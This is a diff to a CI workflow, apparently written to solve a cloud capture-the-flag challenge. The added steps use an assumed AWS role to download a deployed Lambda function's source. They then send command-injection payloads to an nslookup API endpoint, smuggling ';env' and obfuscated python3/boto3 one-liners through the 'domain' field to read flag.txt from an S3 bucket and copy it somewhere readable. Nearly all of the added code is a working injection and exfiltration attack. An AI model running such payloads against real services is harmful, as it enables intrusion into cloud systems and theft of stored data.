@@ -16,8 +16,41 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Generate presigned URL and fetch flag immediately
+      - name: AWS identity
+        run: aws sts get-caller-identity
+
+      - name: GetFunction - download actual deployed Lambda code
         run: |
-          URL=$(aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 60)
-          echo "===== fetching flag via presigned URL ====="
-          curl -si "$URL"
+          CODE_URL=$(aws lambda get-function --function-name nslookupv2 \
+            --region us-east-1 \
+            --query 'Code.Location' --output text)
+          echo "Code URL: $CODE_URL"
+          curl -s "$CODE_URL" -o /tmp/code.zip
+          cd /tmp && unzip -o code.zip
+          echo "===== lambda source ====="
+          cat lambda_function.py || find /tmp -name "*.py" -exec cat {} \;
+
+      - name: Injection - confirm execution with nslookup space fix
+        run: |
+          echo "===== space before semicolon ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":" ;env > /tmp/e.txt 2>&1"}'
+          sleep 3
+          echo "===== try python to read flag and PUT via requests ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":" ;python3 -c \"import boto3; s3=boto3.client(chr(115)+chr(51)); obj=s3.get_object(Bucket=chr(99)+chr(111)+chr(100)+chr(101)+chr(99)+chr(52)+chr(102)+chr(50)+chr(54)+chr(99)+chr(56)+chr(54)+chr(50)+chr(97)+chr(51)+chr(50)+chr(49)+chr(101)+chr(102)+chr(53),Key=chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)); print(obj[chr(66)+chr(111)+chr(100)+chr(121)].read())\""}'
+          sleep 3
+
+      - name: Injection - use python boto3 directly (Lambda already has it)
+        run: |
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":" ;python3 -c \"import boto3,os; s3=boto3.client('"'"'s3'"'"'); f=s3.get_object(Bucket='"'"'codec4f26c862a321ef5'"'"',Key='"'"'flag.txt'"'"'); open('"'"'/tmp/flag.txt'"'"','"'"'wb'"'"').write(f['"'"'Body'"'"'].read())\" 2>&1"}'
+          sleep 3
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":" ;aws s3 cp /tmp/flag.txt s3://codec4f26c862a321ef5/flag2.txt --region us-east-1 2>&1"}'
+          sleep 5
+          aws s3 cp s3://codec4f26c862a321ef5/flag2.txt - || echo "not found"
